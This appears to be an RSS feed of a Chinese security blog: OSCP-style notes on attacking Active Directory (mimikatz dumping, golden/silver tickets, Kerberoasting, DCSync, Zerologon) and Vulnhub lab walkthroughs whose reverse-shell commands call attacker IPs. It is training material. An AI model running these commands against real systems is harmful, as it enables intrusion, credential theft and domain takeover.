<?xml version='1.0' encoding='UTF-8'?>
<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>呆毛的博客</title><link>https:/cha0s32.github.io</link><description>童话是一种生活态度，仅此而已。</description><copyright>呆毛的博客</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://cos.kevinc.ltd/file/download?fileId=1420</url><title>avatar</title><link>https:/cha0s32.github.io</link></image><lastBuildDate>Fri, 15 Dec 2023 01:59:42 +0000</lastBuildDate><managingEditor>呆毛的博客</managingEditor><pubDate>Fri, 15 Dec 2023 01:59:42 +0000</pubDate><ttl>60</ttl><webMaster>呆毛的博客</webMaster><item><title>简单域渗透操作</title><link>https:/cha0s32.github.io/post/jian-dan-yu-shen-tou-cao-zuo.html</link><description>&#13;
&#13;
&#13;
## 信息收集&#13;
&#13;
```shell&#13;
net user /domain&#13;
net group /domain&#13;
net group "Domain Admins" /domain&#13;
# 这种方法没办法收集到组的嵌套关系&#13;
&#13;
# 可以使用PowerView&#13;
Import-Module .\PowerView.ps1&#13;
Get-Netdomain&#13;
Get-NetUser | select cn &#13;
&#13;
# 思路是找高权限用户，找哪一台主机有该用户的登录会话，用普通用户去连那台主机，找内存的hash&#13;
Get-NetGroup | select cn&#13;
Get-NetGroup "Domain Admins" | select member&#13;
Get-NetComputer | select cn,operationsystem,dnshostname&#13;
&#13;
# 寻找普通用户在哪台机器上有本地管理员权限&#13;
Find-LocalAdminAccess&#13;
Get-NetSession #域当中所有主机当前的会话&#13;
Get-NetSession -ComputerName User1 # 查看User1中存在的会话&#13;
&#13;
# 查看账户绑定的spn&#13;
Get-NetUser -SPN | select cn,serviceprincipalname&#13;
# 可以针对SPN服务账号的名称进行密码爆破&#13;
&#13;
#看看解析成什么IP&#13;
nslookup&#13;
&#13;
&#13;
# 找域当中所有主机上的文件共享&#13;
Find-DomainShare&#13;
# 有一个文件共享必定存在 \\域名&#13;
\\oscp.com # 找一个SYSVOL，域当中的策略都在里面&#13;
&#13;
# 各种信息收集可以用SharpHound&#13;
&#13;
&#13;
```&#13;
&#13;
&#13;
&#13;
## 远程登录&#13;
&#13;
&#13;
&#13;
### WMIC&#13;
&#13;
```powershell&#13;
# 在远程主机user1执行命令&#13;
wmic /node:user1 process call create "cmd" # 现在登录的账号对远程主机有管理员权限，登录域的时候做一次身份认证后，执行命令不需要继续认证了&#13;
wmic /node:10.0.2.94 /user:oscp\alice /password:Password2 process call create "cmd"&#13;
&#13;
&#13;
# kali传输文件新方式&#13;
mkdir p&#13;
impacket-smbserver -smb2support p&#13;
&#13;
# 然后在windows上访问\\kali-ip, 然后把要共享的文件拖进去&#13;
# 反弹shell可以用谷安提供的encode.py生成payload&#13;
```&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
### WINRM&#13;
&#13;
端口：5985、5986&#13;
&#13;
平时如果用wmic远程连接可以成功，就不需要用到winrm，如果wmic不能用，可以看看5985、5986端口有没有开&#13;
&#13;
windows默认winrm没启动&#13;
&#13;
```powershell&#13;
# 管理员权限&#13;
Enable-PSRemoting -force&#13;
netstat -ano # 看看端口起了没&#13;
&#13;
winrs -r:user1 "cmd /c hostname &amp; whoami"&#13;
# 非域环境&#13;
winrs -r:user1 -u:oscp\alice -p:Password "cmd /c ipconfig"&#13;
&#13;
# 使用powershell调用winrm&#13;
New-PSSession -ComputerName user1&#13;
Enter-PSSession 1&#13;
```&#13;
&#13;
&#13;
&#13;
### PsExec&#13;
&#13;
```powershell&#13;
.\PsExec64.exe -i \\user1 cmd&#13;
```&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
## 横向渗透&#13;
&#13;
### PTH&#13;
&#13;
机器上存在高权限的本地账号会话的话，密码的hash会缓存在机器的lssas内存中&#13;
&#13;
```powershell&#13;
mimikatz.exe &#13;
privilege::debug&#13;
sekurlsa:logonpassword&#13;
```&#13;
&#13;
```shell&#13;
# kali&#13;
&#13;
impacket-wmiexec -hashes :hash administrator@10.0.2.92&#13;
```&#13;
&#13;
&#13;
&#13;
### Over PTH&#13;
&#13;
在本机上，利用已经获得的hash，给自己申请一个域管理员账号的票据，然后可以登录域的任何一台主机&#13;
&#13;
```powershell&#13;
sekurlsa::pth /user:administrator /domain:oscp.com /ntlm:hash /run:powershell&#13;
# 以管理员的身份打开了powershell&#13;
&#13;
# 打开工具包,已经有管理员的票据了&#13;
PsExec64.exe \\dc1 cmd&#13;
```&#13;
&#13;
&#13;
&#13;
### PTT&#13;
&#13;
服务票据可以从一台机器导入到另一台机器中&#13;
&#13;
Bob可以访问文件共享，Alice不行，但是Alice可以在Bob这台机器中有管理员权限，可以从Bob机器上导出服务票据，导入到Alice的机器中，让Alice有权限访问文件共享&#13;
&#13;
```powershell&#13;
#Bob&#13;
&#13;
sekurlsa::tickets /export&#13;
# 会在 mimikatz 当前目录&#13;
# 拷贝票据到另一台机器&#13;
&#13;
# 票据导入&#13;
kerberos::ptt 票据文件名&#13;
# 导入后就有文件共享的权限了&#13;
```&#13;
&#13;
&#13;
&#13;
## 持久化&#13;
&#13;
### 金票伪造&#13;
&#13;
管理员把密码改了，无法通过PTH来进行登录，可以伪造一张TGT来进行持久化&#13;
&#13;
TGT通过krbtgt的hash来加密，所以伪造TGT需要知道krbtgt的hash&#13;
&#13;
需要的东西：&#13;
&#13;
- 域的SID&#13;
- krbtgt的hash&#13;
- 域当中任何一个用户的用户名&#13;
&#13;
```powershell&#13;
# SID&#13;
&#13;
whoami /user&#13;
&#13;
# krbtgt 需要有域管理员的权限&#13;
mimikatz.exe&#13;
privilege::debug&#13;
lsadump::lsa /patch&#13;
&#13;
# 伪造金票&#13;
kerberos::purge # 清理票据&#13;
kerberos::golden /user:bob /domain:oscp.com /sid:domain-sid /krbtgt:hash /ptt&#13;
&#13;
# 已经是管理员了&#13;
misc::cmd # 打开一个cmd&#13;
&#13;
```&#13;
&#13;
&#13;
&#13;
## 攻击AD域&#13;
&#13;
### Spray Password&#13;
&#13;
域中密码爆破有阈值，所以反过来用密码破解用户名&#13;
&#13;
```powershell&#13;
powershell -ep bypass&#13;
.\Spray-Passwords.ps1 -Pass Password1&#13;
&#13;
# kali下也有这种类型的工具&#13;
crackmapexec smb 10.0.2.94 -u user.txt -p Password1 -d oscp.com&#13;
```&#13;
&#13;
### AS-REP(Pre Auth)&#13;
&#13;
一般用户拿到TGT之前是会经过DC的预身份认证&#13;
&#13;
若DC中给某个管理员账户取消了预身份认证，该用户可以直接得到TGT，可以用所有用户向DC发一个身份认证的请求，返回的信息若有用某个账号hash加密的会话密钥，可以对密钥进行解密&#13;
&#13;
要实现这种攻击：需要有一个普通的账号和密码&#13;
&#13;
```shell&#13;
impacket-GetNPUsers --dc-ip 10.0.2.91 -request -outputfile hash.txt oscp.com/Bob &#13;
# 输入密码&#13;
Password1&#13;
&#13;
# hash.txt 返回的是用alice的hash加密的信息&#13;
hash --help | grep -i kerberos&#13;
hashcat -m 18200 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.txt&#13;
# -r 是规则文件&#13;
```&#13;
&#13;
&#13;
&#13;
### Kerberosting(SPN)&#13;
&#13;
针对SPN的弱密码来进行攻击&#13;
&#13;
```shell&#13;
impacket-GetNuserSPNs -request -dc-ip 10.0.2.91 oscp.com/bob # 知道一个域中普通账号密码就行&#13;
# 输入密码&#13;
&#13;
# 获取由服务账号hash加密的密文 将它生成h.txt&#13;
hashcat -m 13100 h.txt rockyou.txt -r /usr/share/hashcat/rules/best64.txt&#13;
# 获得sqladmin的账号，是域管理理员组的成员&#13;
```&#13;
&#13;
### 银票&#13;
&#13;
用来做提权的&#13;
&#13;
需要：SPN服务账号的密码（如获取明文，可以把它加密成 nt hash)，SPN名，域的SID&#13;
&#13;
```powershell&#13;
mimikatz.exe&#13;
privilege::debug&#13;
kerberos::golden /sid:domain_sid /domain:oscp.com /ptt /target:www.oscp.com /service:http /rc4:spn_hash /user:bob&#13;
```&#13;
&#13;
&#13;
&#13;
### DC同步&#13;
&#13;
一旦获得域控制器的管理员权限，可以把所有账号的hash一次性dump下来&#13;
&#13;
```shell&#13;
impacket-secretdump oscp.com/administrator:"Passw0rd"@10.0.2.91&#13;
```&#13;
&#13;
原本是DC之间用来同步的机制，但是由于没有验证来源主机，所以只要管理员账号密码提供正确，即可dump下来&#13;
&#13;
&#13;
&#13;
### Zerologon&#13;
&#13;
什么信息都收集不了，但是Server 2016没有打补丁的话，有这个漏洞&#13;
&#13;
工具网上搜索`Github ricksense zerologon`&#13;
&#13;
```shell&#13;
cd zerologon&#13;
python set_empty_pw.py dc1 10.0.2.91&#13;
&#13;
# 参考zerologon的github项目，可以把所有账号的hash 都dump下来&#13;
impacket-secretdump -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'oscp.com/dc1@10.0.2.91'&#13;
```&#13;
。</description><guid isPermaLink="true">https:/cha0s32.github.io/post/jian-dan-yu-shen-tou-cao-zuo.html</guid><pubDate>Fri, 15 Dec 2023 01:55:20 +0000</pubDate></item><item><title>靶场练习 9</title><link>https:/cha0s32.github.io/post/ba-chang-lian-xi-%209.html</link><description>## 利用的技术&#13;
&#13;
1. 目录扫描 &amp; 端口扫描&#13;
&#13;
2. exploit 打 mantis&#13;
&#13;
3. 敏感信息获取数据库账号密码&#13;
&#13;
4. 可写目录提权&#13;
&#13;
&#13;
&#13;
## 信息收集&#13;
&#13;
全端口扫描，服务发现&#13;
&#13;
```shell&#13;
nmap -n -v -p- --max-retries=0 172.16.33.53&#13;
nmap -sV -p80,8082,22 172.16.33.53&#13;
```&#13;
&#13;
port：80 8082 22&#13;
&#13;
&#13;
&#13;
目录扫描&#13;
&#13;
```shell&#13;
dirsearch -u 172.16.33.53&#13;
dirsearch -u http://172.16.33.53:8082&#13;
```&#13;
&#13;
location：&#13;
&#13;
- adminer.php &#13;
&#13;
&lt;img src="https://cos.kevinc.ltd/file/download?fileId=1278" alt="image-20230529153256749" style="zoom:50%;" /&gt;&#13;
&#13;
&#13;
&#13;
- cms :  adminer 4.7.1?&#13;
&#13;
/Info.php    phpmyadmin 页面&#13;
&#13;
/system   mantis 页面，针对这个页面继续进行目录扫描&#13;
&#13;
- mantis 页面会进行认证，尝试弱口令admin/admin，成功登录，看返回包字段看到有authorization字段&#13;
&#13;
```shell&#13;
dirsearch -u http://172.16.33.53/system&#13;
```&#13;
&#13;
&#13;
&#13;
注册了一个新用户&#13;
&#13;
![image-20230529153128922](https://cos.kevinc.ltd/file/download?fileId=1276)&#13;
&#13;
没有要求填写密码，直接注册成功&#13;
&#13;
&#13;
&#13;
## 利用漏洞拿shell&#13;
&#13;
```shell&#13;
searchsploit mantis # RCE&#13;
```&#13;
&#13;
改exploit 代码，重点是将authorization字段加进去&#13;
&#13;
```python&#13;
class exploit():&#13;
	def __init__(self):&#13;
		self.s = requests.Session()&#13;
    self.headers={"Authorization":"Basic YWRtaW46YWRtaW4="} # Initialize the headers dictionary&#13;
		self.RHOST = "172.16.33.53" # Victim IP&#13;
		self.RPORT = "80" # Victim port&#13;
		self.LHOST = "10.8.0.86" # Attacker IP&#13;
		self.LPORT = "8086" # Attacker Port&#13;
		self.verify_user_id = "1" # User id for the target account&#13;
		self.realname = "administrator" # Username to hijack&#13;
		self.passwd = "password" # New password after account hijack&#13;
		self.mantisLoc = "/system" # Location of mantis in URL&#13;
		self.ReverseShell = "echo " + b64encode("bash -i &gt;&amp; /dev/tcp/" + self.LHOST + "/" + self.LPORT + " 0&gt;&amp;1") + " | base64 -d | /bin/bash" # Reverse shell payload&#13;
```&#13;
&#13;
运行后成功拿到shell，id一下是最低权限&#13;
&#13;
目录扫描 /system 页面&#13;
&#13;
```shell&#13;
dirsearch -u http://172.16.33.53/system --header="Authorization:Basic YWRtaW46YWRtaW4="&#13;
```&#13;
&#13;
/system/config&#13;
&#13;
/system/api&#13;
&#13;
打开/config 页面有目录遍历，其中 a.txt 文件中有 数据库敏感信息，尝试登录adminer.php 页面，成功登录，且看到数据库中有用户相关的表，打开查看&#13;
&#13;
```shell&#13;
# http://172.16.33.53/system/config/a.txt&#13;
&#13;
$g_hostname      = 'localhost';&#13;
$g_db_username   = 'mantissuser';&#13;
$g_db_password   = 'password@123AS';&#13;
$g_database_name = 'mantis';&#13;
$g_db_type       = 'mysqli';&#13;
```&#13;
&#13;
![image-20230529153200115](https://cos.kevinc.ltd/file/download?fileId=1277)&#13;
&#13;
因为 test 账户创建时没有要求填写密码，而readname为空&#13;
&#13;
猜测realname为密码，尝试登录tre&#13;
&#13;
&lt;img src="https://cos.kevinc.ltd/file/download?fileId=1279" alt="image-20230529153422955" style="zoom:50%;" /&gt;&#13;
&#13;
成功登录&#13;
&#13;
传一个linpeas上去看看，跑了一下linpeas ，没用&#13;
&#13;
&#13;
&#13;
## 提权&#13;
&#13;
看一下有没有可写权限，且为root运行的文件，看到check-system&#13;
&#13;
![image-20230529152239572](https://cos.kevinc.ltd/file/download?fileId=1274)&#13;
&#13;
写入反弹shell&#13;
```shell&#13;
bash -i &gt;&amp; /dev/tcp/10.8.0.86/6666 0&gt;&amp;1&#13;
```&#13;
![image-20230529152205480](https://cos.kevinc.ltd/file/download?fileId=1273)&#13;
&#13;
查询check-system ， 该文件为开机时运行，重启一下主机&#13;
&#13;
```&#13;
sudo shutdown -r&#13;
```&#13;
&#13;
提权成功&#13;
&#13;
![image-20230529152805744](https://cos.kevinc.ltd/file/download?fileId=1275)。</description><guid isPermaLink="true">https:/cha0s32.github.io/post/ba-chang-lian-xi-%209.html</guid><pubDate>Thu, 14 Dec 2023 03:11:57 +0000</pubDate></item><item><title>靶机练习8: decoy</title><link>https:/cha0s32.github.io/post/ba-ji-lian-xi-8%3A%20decoy.html</link><description>&#13;
&#13;
## 靶机地址&#13;
&#13;
https://www.vulnhub.com/entry/sunset-decoy,505/&#13;
&#13;
## 信息收集&#13;
&#13;
全端口扫描发现服务，并扫描其版本&#13;
&#13;
```shell&#13;
sudo masscan -p1-65535,U:1-65535 172.16.33.40 --rate=5000 -e tun0&#13;
sudo nmap -p22,80 -sV -A 172.16.33.40&#13;
```&#13;
&#13;
| 端口 | 服务   | 利用点               | 结果 |&#13;
| ---- | ------ | -------------------- | ---- |&#13;
| 80   | apache | save.zip             | 待定 |&#13;
| 22   | Ssh    | 暂无，必要时考虑爆破 | 暂无 |&#13;
&#13;
访问80端口，将save.zip下载下来&#13;
&#13;
![](https://cos.kevinc.ltd/file/download?fileId=1074)&#13;
&#13;
使用`john`破解压缩包密码，得到`etc`&#13;
&#13;
```shell&#13;
zip2john save.zip &gt; save.hash&#13;
john save.hash --wordlist=rockyou.txt&#13;
```&#13;
&#13;
&#13;
&#13;
`etc`中有`passwd`和`shadow`,可以结合破解&#13;
&#13;
```shell&#13;
unshadow passwd shadow &gt; unshadow&#13;
john --rules --wordlists=rockyou.txt unshadow&#13;
```&#13;
&#13;
可以破解出某个账户 ( 账户名一长串，不想打了，以guest代替吧！) 的密码为`server`&#13;
&#13;
&#13;
&#13;
`ssh`进去后查看文件&#13;
&#13;
![](https://cos.kevinc.ltd/file/download?fileId=1075)&#13;
&#13;
&gt; 后期截图，有一些是我后面传上去的文件，可以看到有普通用户proof文件user.txt，但由于shell为rbash，需要绕过&#13;
&#13;
&#13;
&#13;
## Get shell&#13;
&#13;
`shell`为`rbash`, 所以需要绕过&#13;
&#13;
```shell&#13;
-t "bash --no-profile" # ssh后面加&#13;
```&#13;
&#13;
进去以后查看命令无法使用，查看环境变量，`echo $PATH`&#13;
&#13;
![](https://cos.kevinc.ltd/file/download?fileId=1076)&#13;
&#13;
当前环境变量为家目录，无法直接使用命令&#13;
&#13;
```shell&#13;
# 改为&#13;
PATH=/usr/local/sbin/:/usr/sbin/bin/:/usr/sbin/:/usr/bin/://sbin/:/bin/&#13;
```&#13;
&#13;
可查看`user.txt`&#13;
&#13;
![](https://cos.kevinc.ltd/file/download?fileId=1077)&#13;
&#13;
&#13;
&#13;
## 提权&#13;
&#13;
上传`linpeas.sh`, 赋予执行权限后运行&#13;
&#13;
```shell&#13;
可疑提权向量（尽量忽略内核提权）：&#13;
&#13;
数据库配置文件： /etc/mysql/mariadb.cnf 可读&#13;
&#13;
suid权限：&#13;
&#13;
pkexec 利用没成功&#13;
sudo  查看版本是否有漏洞  漏洞需要管理员权限修改文件&#13;
&#13;
SV502/log.txt&#13;
&#13;
```&#13;
&#13;
发现`SV502/logs/log.txt` 日志文件里有提到`chkrootkit`，该文件用于检测系统中是否被安装rootkit的&#13;
&#13;
主目录中存在`honeypot.decoy`，为`root`用户所有，尝试运行&#13;
&#13;
![](https://cos.kevinc.ltd/file/download?fileId=1078)&#13;
&#13;
**5**是`AV扫描`,猜测跟`chkrootkit`有关，尝试运行&#13;
&#13;
使用`ps aux | grep chkrootkit`，知道`chkrootkit`为`root`运行&#13;
&#13;
![](https://cos.kevinc.ltd/file/download?fileId=1081)&#13;
&#13;
使用`searchsploit chkrootkit`查看利用方法&#13;
&#13;
![](https://cos.kevinc.ltd/file/download?fileId=1080)&#13;
&#13;
利用方法很简单&#13;
&#13;
```shell&#13;
echo "bash -c 'exec bash -i &amp;&gt;/dev/tcp/10.8.0.86/4444 &lt;&amp;1'" &gt; /tmp/update&#13;
./honeypot.decoy&#13;
&#13;
#kali&#13;
nc -nvlp 4444&#13;
```&#13;
&#13;
&lt;img src="https://cos.kevinc.ltd/file/download?fileId=1083" style="zoom:50%;" /&gt;。</description><guid isPermaLink="true">https:/cha0s32.github.io/post/ba-ji-lian-xi-8%3A%20decoy.html</guid><pubDate>Thu, 14 Dec 2023 02:54:53 +0000</pubDate></item><item><title>靶机练习7：LOLY</title><link>https:/cha0s32.github.io/post/ba-ji-lian-xi-7%EF%BC%9ALOLY.html</link><description>&#13;
&#13;
## 靶机地址&#13;
&#13;
https://www.vulnhub.com/entry/loly-1,538/&#13;
&#13;
## 信息收集&#13;
&#13;
扫描全端口，进行服务发现&#13;
&#13;
```&#13;
nmap -n -v -sS -max-retries=0 -p- 172.16.33.25&#13;
```&#13;
&#13;
![https://cos.kevinc.ltd/file/download?fileId=1019](https://cos.kevinc.ltd/file/download?fileId=1019)&#13;
&#13;
发现只有80端口的web服务&#13;
&#13;
进行进一步的版本发现和目录扫描（使用了nmap 的vuln脚本）&#13;
&#13;
```&#13;
sudo nmap -p80 -script=vuln 172.16.33.25&#13;
```&#13;
&#13;
![https://cos.kevinc.ltd/file/download?fileId=1020](https://cos.kevinc.ltd/file/download?fileId=1020)&#13;
&#13;
发现有目录`/wordpress`和`wordpress/wp-login.php`，其中含有wordpress的登录页面&#13;
&#13;
```&#13;
dirsearch -u 172.16.33.25 -w  /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50&#13;
```&#13;
&#13;
![https://cos.kevinc.ltd/file/download?fileId=1021](https://cos.kevinc.ltd/file/download?fileId=1021)&#13;
&#13;
## 利用漏洞获取shell&#13;
&#13;
访问`/wordpress/wp-login.php`，随机输入账号密码，提示无法访问服务`loly.lc`&#13;
&#13;
![https://cos.kevinc.ltd/file/download?fileId=1022](https://cos.kevinc.ltd/file/download?fileId=1022)&#13;
&#13;
需要在`/etc/hosts`进行域名解析&#13;
&#13;
```&#13;
#oscp&#13;
172.16.33.25 loly.lc&#13;
```&#13;
&#13;
重新访问，提示未知用户名&#13;
&#13;
由于服务是`wordpress`，可以使用工具`wpscan`进行用户名枚举&#13;
&#13;
```&#13;
wpscan --url http://172.16.33.25/wordpress -e&#13;
```&#13;
&#13;
![https://cos.kevinc.ltd/file/download?fileId=1023](https://cos.kevinc.ltd/file/download?fileId=1023)&#13;
&#13;
获取用户名为`loly`，继续破解密码&#13;
&#13;
```&#13;
wpscan --url http://172.16.33.25/wordpress -U loly -P /usr/share/wordlists/rockyou.txt&#13;
```&#13;
&#13;
![https://cos.kevinc.ltd/file/download?fileId=1025](https://cos.kevinc.ltd/file/download?fileId=1025)&#13;
&#13;
使用获得的用户名和密码登录`wordpress`后台&#13;
&#13;
![https://cos.kevinc.ltd/file/download?fileId=1026](https://cos.kevinc.ltd/file/download?fileId=1026)&#13;
&#13;
登录后台后找不到`Appearance`下的`Editor`，无法将木马写到404页面中&#13;
&#13;
发现`AdRotate`的`Manage Media`中有上传点，可以尝试上传木马&#13;
&#13;
使用`/usr/share/webshells/php`下的`php-reverse-shell.php`，将地址和端口改一下，改名后压缩为`shell.zip`&#13;
&#13;
![https://cos.kevinc.ltd/file/download?fileId=1027](https://cos.kevinc.ltd/file/download?fileId=1027)&#13;
&#13;
在`Settings`处可以看到上传路径&#13;
&#13;
![https://cos.kevinc.ltd/file/download?fileId=1028](https://cos.kevinc.ltd/file/download?fileId=1028)&#13;
&#13;
在kali端监听设置端口，并在网页中访问`wordpress/wp-content/banners/shell.php`,获得shell&#13;
&#13;
![https://cos.kevinc.ltd/file/download?fileId=1029](https://cos.kevinc.ltd/file/download?fileId=1029)&#13;
&#13;
## 提权&#13;
&#13;
尝试上传 linpeas.sh 到靶机，发现不行，最后发现 `/tmp`目录中才能上传成功&#13;
&#13;
通过`linpeas.sh`的提示，发现有现成的`exploit`可利用&#13;
&#13;
![https://cos.kevinc.ltd/file/download?fileId=1030](https://cos.kevinc.ltd/file/download?fileId=1030)&#13;
&#13;
&gt; 刚开始用了40871.c这个exploit, 发现在kali上编译成功后靶机上执行不了，直接传到靶机上也编译不成功&#13;
&gt; &#13;
&#13;
使用`searchsploit`找到`exploit`，在kali中进行编译&#13;
&#13;
```&#13;
searchsploit -m 45010&#13;
gcc 45010.c -o exploit&#13;
```&#13;
&#13;
传到靶机上，赋予执行权限后执行&#13;
&#13;
![https://cos.kevinc.ltd/file/download?fileId=1031](https://cos.kevinc.ltd/file/download?fileId=1031)&#13;
&#13;
成功获得root 权限，可查看 root.txt&#13;
&#13;
## 参考资料&#13;
&#13;
[Wordpress网站渗透测试](https://blog.csdn.net/weixin_51957047/article/details/124985217)。</description><guid isPermaLink="true">https:/cha0s32.github.io/post/ba-ji-lian-xi-7%EF%BC%9ALOLY.html</guid><pubDate>Thu, 14 Dec 2023 02:39:24 +0000</pubDate></item><item><title>靶机练习6: BSS(Cute 1.0.2)</title><link>https:/cha0s32.github.io/post/ba-ji-lian-xi-6%3A%20BSS%28Cute%201.0.2%29.html</link><description>&#13;
&#13;
## 靶机地址&#13;
&#13;
https://www.vulnhub.com/entry/bbs-cute-102,567/&#13;
&#13;
## 信息收集&#13;
&#13;
进行全端口扫描，确认目标开放端口和服务&#13;
&#13;
```shell&#13;
nmap -n -v -sS --max-retries=0 -p- 172.16.33.9&#13;
```&#13;
&#13;
&lt;img src="https://cos.kevinc.ltd/file/download?fileId=835" style="zoom:50%;" /&gt;&#13;
&#13;
对开放端口进行版本的扫描&#13;
&#13;
```shell&#13;
nmap -sV -p22,80,88,110,995 -A 172.16.33.9&#13;
```&#13;
&#13;
通过对各自服务的信息收集，并无入手点。</description><guid isPermaLink="true">https:/cha0s32.github.io/post/ba-ji-lian-xi-6%3A%20BSS%28Cute%201.0.2%29.html</guid><pubDate>Thu, 14 Dec 2023 02:33:26 +0000</pubDate></item><item><title>靶机练习5: Sar</title><link>https:/cha0s32.github.io/post/ba-ji-lian-xi-5%3A%20Sar.html</link><description>&#13;
&#13;
## 靶机地址&#13;
&#13;
https://www.vulnhub.com/entry/sar-1,425/&#13;
&#13;
&#13;
&#13;
## 信息收集阶段&#13;
&#13;
进行全端口扫描，枚举目标的端口和服务&#13;
&#13;
```shell&#13;
nmap -n -v -sS --max-retries=0 -p- 172.16.33.13&#13;
```&#13;
&#13;
&#13;
&#13;
&lt;img src="https://cos.kevinc.ltd/file/download?fileId=804" style="zoom: 50%;" /&gt;&#13;
&#13;
```shell&#13;
nmap -sV -p80 -A 172.16.33.13&#13;
```&#13;
&#13;
&#13;
&#13;
只有80端口放通，扫描端口服务版本&#13;
&#13;
&lt;img src="https://cos.kevinc.ltd/file/download?fileId=805" style="zoom: 33%;" /&gt;&#13;
&#13;
访问web服务，发现是`apache`默认页面，无可用信息&#13;
&#13;
&lt;img src="https://cos.kevinc.ltd/file/download?fileId=806" style="zoom: 33%;" /&gt;&#13;
&#13;
使用`dirsearch`对目录进行扫描，发现有敏感文件`phpinfo.php`和`robots.txt`&#13;
&#13;
&lt;img src="https://cos.kevinc.ltd/file/download?fileId=808" style="zoom: 33%;" /&gt;&#13;
&#13;
访问`robots.txt`，发现有`sar2HTML`, 访问一下&#13;
&#13;
&lt;img src="https://cos.kevinc.ltd/file/download?fileId=809" style="zoom: 33%;" /&gt;&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
## 利用漏洞拿shell&#13;
&#13;
使用`searchsploit`查询有无`sar2HTML`的漏洞利用代码，结果如下&#13;
&#13;
&lt;img src="https://cos.kevinc.ltd/file/download?fileId=810" style="zoom: 33%;" /&gt;&#13;
&#13;
看一下具体内容，其实`py`文件就是`txt`文件的代码实现，使用`py`脚本&#13;
&#13;
&lt;img src="https://cos.kevinc.ltd/file/download?fileId=811" style="zoom: 33%;" /&gt;&#13;
&#13;
拿到普通权限，需要在远程主机弹一个shell回攻击机&#13;
&#13;
尝试执行命令 `nc 10.8.0.17 8888 -e /bin/bash`，然后在攻击机上执行 `nc -nvlp 8888`&#13;
&#13;
没有弹成功，怀疑是命令执行过滤了`-e`参数&#13;
&#13;
有两种思路可以绕过，都可以成功执行&#13;
&#13;
第一为**NC串联** &#13;
&#13;
```shell&#13;
&gt; sar-command&#13;
nc 10.8.0.17 6666 | /bin/bash | nc 10.8.0.17 8888&#13;
&#13;
&gt; kali&#13;
&gt; 开两个窗口&#13;
&#13;
nc -nvlp 6666 # 用于输入命令&#13;
nc -nvlp 8888 # 用于输出结果&#13;
```&#13;
&#13;
效果如下&#13;
&#13;
&lt;img src="https://cos.kevinc.ltd/file/download?fileId=812" style="zoom: 33%;" /&gt;&#13;
&#13;
第二种为**对反弹shell进行编码**&#13;
&#13;
&lt;img src="https://cos.kevinc.ltd/file/download?fileId=813" style="zoom: 33%;" /&gt;&#13;
&#13;
&#13;
&#13;
## 提权&#13;
&#13;
先用`linpeas.sh`脚本对提权信息进行收集&#13;
&#13;
发现有一个计划任务可尝试利用&#13;
&#13;
&lt;img src="https://cos.kevinc.ltd/file/download?fileId=814" style="zoom: 33%;" /&gt;&#13;
&#13;
查看改脚本文件，发现执行的是另一个脚本文件`write.sh`，查看权限发现其可写可执行，尝试写shell&#13;
&#13;
&lt;img src="https://cos.kevinc.ltd/file/download?fileId=815" style="zoom: 33%;" /&gt;&#13;
&#13;
```shell&#13;
echo "bash -c 'exec bash -i &amp;&gt;/dev/tcp/10.8.0.17/6666 &gt;&amp;1'" &gt; write.sh&#13;
```&#13;
&#13;
攻击机上监听 6666 端口，过一段时间即可获得 root 权限&#13;
&#13;
&lt;img src="https://cos.kevinc.ltd/file/download?fileId=816" style="zoom: 33%;" /&gt;&#13;
。</description><guid isPermaLink="true">https:/cha0s32.github.io/post/ba-ji-lian-xi-5%3A%20Sar.html</guid><pubDate>Thu, 14 Dec 2023 02:19:48 +0000</pubDate></item><item><title>靶机练习4: SolidState</title><link>https:/cha0s32.github.io/post/ba-ji-lian-xi-4%3A%20SolidState.html</link><description>&#13;
## 信息收集阶段&#13;
&#13;
全端口扫描，查询目标靶机开放端口和服务&#13;
&#13;
```shell&#13;
sudo nmap -p- -n -v -sS --max-retries=0 172.16.33.35&#13;
```&#13;
&#13;
&lt;img src="https://cos.kevinc.ltd/file/download?fileId=795" style="zoom:33%;" /&gt;&#13;
&#13;
&#13;
&#13;
进行服务版本扫描&#13;
&#13;
```shell&#13;
nmap -p22,25,80,110,119,4555 -sV -A 172.16.33.35&#13;
```&#13;
&#13;
&lt;img src="https://cos.kevinc.ltd/file/download?fileId=796" style="zoom:33%;" /&gt;&#13;
&#13;
发现有陌生服务`james-admin`,尝试用`searchsploit`看看是否有利用脚本&#13;
&#13;
&lt;img src="https://cos.kevinc.ltd/file/download?fileId=797" style="zoom:33%;" /&gt;&#13;
&#13;
有几个版本符合的脚本，尝试利用，但都不成功&#13;
&#13;
&lt;img src="https://cos.kevinc.ltd/file/download?fileId=798" style="zoom:33%;" /&gt;&#13;
&#13;
查看脚本具体内容，发现`james-admin`默认账号密码都为`root`, 尝试登录&#13;
&#13;
&lt;img src="https://cos.kevinc.ltd/file/download?fileId=799" style="zoom:33%;" /&gt;&#13;
&#13;
使用`help`查看可用命令，注意到有枚举用户的命令`listusers` 和修改密码的命令`setpassword`，修改各用户密码，然后登录`POP3` 邮箱服务，看各用户的邮件，命令如下：&#13;
&#13;
```shell&#13;
nc -C 172.16.33.35 110&#13;
&#13;
USER mindy&#13;
PASS 123&#13;
&#13;
LIST  # 列出所有邮件&#13;
RETR 1 # 查看对应邮件&#13;
```&#13;
&#13;
&#13;
&#13;
## 利用漏洞拿shell&#13;
&#13;
发现`mindy`的邮件中有账号密码的泄漏，尝试拿这个账号密码去登录远程服务器&#13;
&#13;
登录成功！尝试修改密码，发现`Shell`被限制，为`rbash`&#13;
&#13;
&lt;img src="https://cos.kevinc.ltd/file/download?fileId=801" style="zoom:33%;" /&gt;&#13;
&#13;
尝试绕过`rbash`, 这里使用的方法是登录时加入 `-t "bash --noprofile"`&#13;
&#13;
```shell&#13;
ssh mindy@172.16.33.35 -t "bash --noprofile"&#13;
```&#13;
&#13;
